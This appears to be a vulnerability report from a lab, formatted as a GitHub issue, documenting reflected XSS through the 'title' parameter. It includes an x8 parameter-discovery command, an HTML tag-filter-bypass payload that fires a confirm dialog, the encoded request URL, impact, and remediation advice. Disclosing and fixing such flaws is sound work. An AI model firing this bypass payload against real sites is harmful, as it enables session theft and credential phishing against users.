## Title
Reflected XSS - HTML Tag Filter Bypass

## Description

The application at `https://news.pwnedbox.site/` is vulnerable to Reflected Cross-Site Scripting (XSS) through the `title` GET parameter.

During parameter discovery using x8, the parameters `fname`, `lname`, and `title` were identified as reflected. Further testing demonstrated that a crafted input through the `title` parameter bypassed the HTML tag filtering and executed JavaScript in the browser.

The successful execution was confirmed by a JavaScript confirmation dialog displaying `1`.

**Affected URL:** https://news.pwnedbox.site/  
**HTTP Method:** GET  
**Affected Parameter:** `title`

## Steps to Reproduce

1. Run parameter discovery against `https://news.pwnedbox.site/`:
   ```bash
   x8 -u https://news.pwnedbox.site/ -X GET --disable-progress-bar --reflected-only -w params.txt
   ```
2. Open the following URL in a browser with the crafted value in the `title` parameter:
   ```text
   https://news.pwnedbox.site/?title=%27%22%3C!--%3E%3C/Title%3E%3C/Text%20area%3E%3C/Script%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)-->
   ```
3. Observe the JavaScript confirmation dialog displaying `1`.
4. Dismiss the dialog and verify that the page loads with the injected input reflected.

## POC (Proof of Concept)

**Lab Address:** https://news.pwnedbox.site/  
**HTTP Method:** GET  
**Vulnerable Parameter:** `title`

**Payload:**
```html
'"><!--></Title></Text area></Script></Iframe><Details/Open/OnToggle%3D(confirm)(1)-->
```

**Request Parameter:**
```http
?title=%27%22%3C!--%3E%3C/Title%3E%3C/Text%20area%3E%3C/Script%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)-->
```

**Observed Result:**

The application reflected the supplied input and the browser executed the injected JavaScript. A confirmation dialog displaying `1` appeared, demonstrating successful reflected XSS.

**Screenshot Evidence:**

1. x8 output identifying `fname`, `lname`, and `title` as reflected parameters.
<img width="1492" height="769" alt="image" src="https://github.com/user-attachments/assets/0b207859-c0ce-4c4c-80f3-d6c4d2d6f96d" />

2. Browser showing the crafted `title` parameter in the address bar and the GET Parameter Reflection page.
<img width="1919" height="970" alt="image" src="https://github.com/user-attachments/assets/b9ee1486-697e-4fc5-9f75-356ff31537db" />

3. JavaScript confirmation dialog displaying `1`.
<img width="1916" height="967" alt="image" src="https://github.com/user-attachments/assets/d353c4f4-afba-4559-b943-d80dd82e2f2a" />


## Impact

An attacker could craft a malicious URL and trick users into opening it. Depending on the application's session protections and execution context, this could lead to:

- Potential theft of session information if accessible to injected JavaScript.
- Potential impact on administrators who visit the affected page.
- Injection of fake login forms to trick users into submitting credentials.
- Unauthorized actions within a victim's authenticated session, depending on application protections.

## Remediation

1. Prevent HTML injection by applying context-aware output encoding to user-controlled values such as `title`. Do not rely only on filtering HTML tags like `<script>`, `<img>`, or `<svg>`.
2. Do not rely on blocking JavaScript methods such as `alert()`, `confirm()`, or `prompt()`. Prevent script execution through proper encoding and sanitization.
3. If using PHP, apply `htmlspecialchars()` with appropriate flags and UTF-8 encoding before rendering user input into HTML.
4. Use a restrictive Content Security Policy (CSP) and consider Cloudflare WAF rules as an additional security layer. A WAF should not replace secure output handling.
